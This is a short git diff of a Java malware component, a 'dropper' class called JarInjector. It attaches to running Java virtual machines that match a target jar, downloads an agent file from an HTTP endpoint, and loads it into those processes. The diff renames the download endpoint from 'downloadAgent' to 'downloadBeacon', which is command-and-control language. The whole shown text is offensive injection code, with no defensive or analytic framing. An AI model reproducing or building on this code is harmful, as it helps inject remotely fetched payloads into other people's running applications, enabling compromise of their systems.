@@ -1,17 +1,13 @@
 package dropper.injector;
 
-import static dropper.utils.HttpUtil.downloadFileHttp;
+import com.sun.tools.attach.*;
 
 import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Collection;
 
-import com.sun.tools.attach.AgentInitializationException;
-import com.sun.tools.attach.AgentLoadException;
-import com.sun.tools.attach.AttachNotSupportedException;
-import com.sun.tools.attach.VirtualMachine;
-import com.sun.tools.attach.VirtualMachineDescriptor;
+import static dropper.utils.HttpUtil.downloadFileHttp;
 
 public class JarInjector {
 	public Collection<String> getInjectableJars() {
@@ -29,7 +25,7 @@ public class JarInjector {
 			if (vmd.displayName().equals(jarName)) {
 				try {
 					VirtualMachine jvm = VirtualMachine.attach(vmd.id());
-					String agentUrl = "http://localhost:8000/downloadAgent";
+					String agentUrl = "http://localhost:8081/downloadBeacon";
 					File agent = new File(agentName);
 					downloadFileHttp(agentUrl, agent.getPath());
 					jvm.loadAgent(agent.getPath());
